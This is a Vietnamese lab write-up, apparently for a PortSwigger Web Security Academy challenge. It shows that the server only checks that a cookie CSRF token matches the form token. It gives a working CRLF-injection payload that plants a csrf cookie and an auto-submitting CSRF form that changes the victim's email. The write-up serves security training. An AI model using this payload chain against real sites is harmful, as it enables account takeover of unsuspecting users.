![image](https://github.com/user-attachments/assets/debb1a7f-68ef-4240-b012-33211f25b562)

Đọc challenge này thì ta có thể thấy được rằng lần này nó kêu có x2 csrf token :">>???

![image](https://github.com/user-attachments/assets/48c5db49-53ff-4ade-bcc4-5ae0ea6b801c)

Voãi ò, có 2 cái csrf token thật, nhưng chỉ có 1 acc =)), vậy idea bây giờ là gì nhỉ ???

Ta hãy thử sửa đổi csrf token đi.

![image](https://github.com/user-attachments/assets/8766efaf-799b-4e75-969c-7ba389a950f1)

![image](https://github.com/user-attachments/assets/7f02fa44-2706-4dbf-8bb8-68633d5485e0)

Bạn có thể thấy lần này server nó không check csrf token này có thực sự tồn tại trên server hay không mà nó chỉ check là 2 cái đó giống nhau là pass =)).

web này cũng có search như challenge trước, vậy thì tiến hành tạo poc thôi cũng là `crlf injection -> xss -> csrf`

**crlf injection -> xss**

```
<img src = "https://0aa4004d0406cc84805c35e400df0088.web-security-academy.net/?search=abc%0d%0aSet-Cookie:%20csrf%3da;SameSite%3dNone;">
```

**csrf**

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa4004d0406cc84805c35e400df0088.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="admin&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="a" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
<img src = "https://0aa4004d0406cc84805c35e400df0088.web-security-academy.net/?search=abc%0d%0aSet-Cookie:%20csrf%3da;SameSite%3dNone;">
  </body>
</html>
```

![image](https://github.com/user-attachments/assets/3380e73b-890a-4505-a5f5-6179ea524288)

Vậy là thành công.
